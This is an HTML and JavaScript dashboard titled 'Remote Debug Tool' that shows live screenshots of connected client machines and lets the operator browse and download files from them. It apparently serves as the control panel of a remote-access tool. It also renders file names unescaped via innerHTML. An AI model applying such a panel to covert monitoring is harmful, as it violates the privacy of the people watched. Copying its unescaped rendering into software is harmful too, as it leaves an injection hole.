<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Debug Tool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        .screenshot { object-fit: contain; }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen">
    <div class="container mx-auto p-4">
        <header class="mb-6 flex justify-between items-center">
            <h1 class="text-2xl font-bold">Remote Debug Tool</h1>
            <span id="connection-status" class="text-sm px-3 py-1 rounded bg-gray-700">Connecting...</span>
        </header>

        <div id="grid-view">
            <h2 class="text-xl mb-4">Connected Clients</h2>
            <div id="clients-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
            </div>
        </div>

        <div id="detail-view" class="hidden">
            <button onclick="showGrid()" class="mb-4 px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">← Back</button>
            <button onclick="showFiles()" class="mb-4 ml-2 px-4 py-2 bg-blue-700 rounded hover:bg-blue-600">📁 Files</button>
            <h2 id="detail-client-id" class="text-xl mb-4"></h2>
            <img id="detail-screenshot" class="w-full bg-black rounded" alt="Client screenshot">
        </div>

        <div id="file-view" class="hidden">
            <button onclick="showDetail(selectedClient)" class="mb-4 px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">← Back</button>
            <h2 id="file-browser-title" class="text-xl mb-4"></h2>
            <div id="file-list" class="bg-gray-800 rounded p-4"></div>
        </div>
    </div>

    <script>
        const socket = io();
        let clients = {};
        let selectedClient = null;
        let currentPath = '';

        function showGrid() {
            if (selectedClient) {
                socket.emit('stop_viewing', {client_id: selectedClient});
            }
            document.getElementById('grid-view').classList.remove('hidden');
            document.getElementById('detail-view').classList.add('hidden');
            document.getElementById('file-view').classList.add('hidden');
            selectedClient = null;
            currentPath = '';
        }

        function showDetail(clientId) {
            if (selectedClient && selectedClient !== clientId) {
                socket.emit('stop_viewing', {client_id: selectedClient});
            }
            selectedClient = clientId;
            currentPath = '';
            document.getElementById('grid-view').classList.add('hidden');
            document.getElementById('detail-view').classList.remove('hidden');
            document.getElementById('file-view').classList.add('hidden');
            document.getElementById('detail-client-id').textContent = clientId;
            socket.emit('start_viewing', {client_id: clientId});
        }

        function showFiles() {
            document.getElementById('detail-view').classList.add('hidden');
            document.getElementById('file-view').classList.remove('hidden');
            currentPath = '';
            loadFileList('');
        }

        async function loadFileList(path) {
            currentPath = path;
            const displayPath = path ? '/' + path : '/';
            document.getElementById('file-browser-title').textContent = `Files: ${displayPath}`;
            
            console.log('Loading file list for path:', path);
            
            try {
                const resp = await fetch(`/file/${selectedClient}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({path: path})
                });
                const data = await resp.json();
                console.log('File list response:', data);
                
                const fileList = document.getElementById('file-list');
                fileList.innerHTML = '';
                
                if (data.is_dir) {
                    if (path) {
                        const parentBtn = document.createElement('div');
                        parentBtn.className = 'flex items-center p-2 hover:bg-gray-700 cursor-pointer rounded';
                        parentBtn.onclick = () => loadFileList(path.split('/').slice(0, -1).join('/'));
                        parentBtn.innerHTML = '<span class="text-2xl mr-2">📁</span><span class="text-blue-400">..</span>';
                        fileList.appendChild(parentBtn);
                    }
                    
                    data.items.forEach(item => {
                        const row = document.createElement('div');
                        row.className = 'flex items-center justify-between p-2 hover:bg-gray-700 rounded';
                        
                        const left = document.createElement('div');
                        left.className = 'flex items-center cursor-pointer flex-1';
                        left.onclick = () => {
                            if (item.is_dir) {
                                const newPath = path ? path + '/' + item.name : item.name;
                                loadFileList(newPath);
                            } else {
                                openFile(path ? path + '/' + item.name : item.name);
                            }
                        };
                        left.innerHTML = `<span class="text-2xl mr-2">${item.is_dir ? '📁' : '📄'}</span><span>${item.name}</span>`;
                        
                        const right = document.createElement('div');
                        if (!item.is_dir) {
                            const openBtn = document.createElement('button');
                            openBtn.className = 'px-2 py-1 bg-green-700 rounded text-sm hover:bg-green-600 mr-2';
                            openBtn.textContent = 'Open in Browser';
                            openBtn.onclick = (e) => { e.stopPropagation(); openFile(path ? path + '/' + item.name : item.name); };
                            
                            const dlBtn = document.createElement('button');
                            dlBtn.className = 'px-2 py-1 bg-blue-700 rounded text-sm hover:bg-blue-600';
                            dlBtn.textContent = 'Download';
                            dlBtn.onclick = (e) => { e.stopPropagation(); downloadFile(path ? path + '/' + item.name : item.name); };
                            
                            right.appendChild(openBtn);
                            right.appendChild(dlBtn);
                        }
                        
                        row.appendChild(left);
                        row.appendChild(right);
                        fileList.appendChild(row);
                    });
                } else {
                    const msg = document.createElement('div');
                    msg.className = 'text-gray-400';
                    msg.textContent = 'This is a file, not a directory';
                    fileList.appendChild(msg);
                }
            } catch (e) {
                console.error(e);
            }
        }

        function openFile(path) {
            window.open(`/file/${selectedClient}/${encodeURIComponent(path)}`, '_blank');
        }

        function downloadFile(path) {
            window.open(`/download/${selectedClient}/${encodeURIComponent(path)}`, '_blank');
        }

        function renderClients() {
            const grid = document.getElementById('clients-grid');
            grid.innerHTML = '';
            
            Object.keys(clients).forEach(clientId => {
                const client = clients[clientId];
                const card = document.createElement('div');
                card.className = 'bg-gray-800 rounded-lg overflow-hidden cursor-pointer hover:ring-2 hover:ring-blue-500';
                card.onclick = () => showDetail(clientId);
                
                const img = document.createElement('img');
                img.className = 'w-full h-32 object-cover bg-black';
                img.src = client.screenshot || 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
                
                const info = document.createElement('div');
                info.className = 'p-2';
                info.innerHTML = `<span class="text-sm font-mono">${clientId}</span>`;
                
                card.appendChild(img);
                card.appendChild(info);
                grid.appendChild(card);
            });
        }

        function updateDetailScreenshot() {
            if (selectedClient && clients[selectedClient]) {
                const img = document.getElementById('detail-screenshot');
                img.src = clients[selectedClient].screenshot || img.src;
            }
        }

        socket.on('connect', () => {
            document.getElementById('connection-status').textContent = 'Connected';
            document.getElementById('connection-status').className = 'text-sm px-3 py-1 rounded bg-green-700';
        });

        socket.on('disconnect', () => {
            document.getElementById('connection-status').textContent = 'Disconnected';
            document.getElementById('connection-status').className = 'text-sm px-3 py-1 rounded bg-red-700';
        });

        let lastReload = parseInt(sessionStorage.getItem('lastReload') || '0');
        let hasConnectedBefore = sessionStorage.getItem('hasConnectedBefore') === 'true';

        socket.on('reload', () => {
            if (!hasConnectedBefore) return;
            const now = Date.now();
            if (now - lastReload > 5000) {
                console.log('Server restarted, reloading...');
                lastReload = now;
                sessionStorage.setItem('lastReload', now.toString());
                setTimeout(() => window.location.reload(), 100);
            }
        });

        socket.on('connect', () => {
            hasConnectedBefore = true;
            sessionStorage.setItem('hasConnectedBefore', 'true');
            fetch('/clients')
                .then(r => r.json())
                .then(data => {
                    data.forEach(c => {
                        if (!clients[c.id]) clients[c.id] = { screenshot: null };
                        clients[c.id].connected = c.connected;
                    });
                    renderClients();
                });
        });

        socket.on('screenshot', (data) => {
            if (!clients[data.client_id]) {
                clients[data.client_id] = {};
            }
            clients[data.client_id].screenshot = data.image;
            clients[data.client_id].timestamp = data.timestamp;
            
            if (selectedClient === data.client_id) {
                updateDetailScreenshot();
            } else {
                renderClients();
            }
        });

        socket.on('connected', (data) => {
            if (!data.client_id) return;
            if (!clients[data.client_id]) {
                clients[data.client_id] = { screenshot: null };
            }
            clients[data.client_id].connected = true;
            renderClients();
        });

        socket.on('disconnected', (data) => {
            if (clients[data.client_id]) {
                clients[data.client_id].connected = false;
                renderClients();
            }
        });

        socket.on('client_removed', (data) => {
            delete clients[data.client_id];
            if (selectedClient === data.client_id) {
                showGrid();
            }
            renderClients();
        });

        setInterval(() => {
            if (selectedClient) {
                fetch(`/clients/${selectedClient}/latest`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.screenshot) {
                            clients[selectedClient].screenshot = data.screenshot;
                            updateDetailScreenshot();
                        }
                    })
                    .catch(() => {});
            }
        }, 1000);
    </script>
</body>
</html>
